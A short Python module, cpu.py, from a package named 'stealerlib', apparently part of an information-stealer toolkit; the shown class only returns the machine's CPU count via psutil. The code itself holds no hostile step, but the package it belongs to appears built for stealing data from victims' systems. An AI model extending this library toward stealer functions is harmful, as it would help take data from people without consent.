#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: stealerlib/system/cpu.py
"""

from stealerlib.system import *
from stealerlib.system.cpu.processes import Processes


class CPU(Processes):
    def __init__(self):
        Processes.__init__(self)

    @catch
    def get_cpu_count(self):

        return psutil.cpu_count()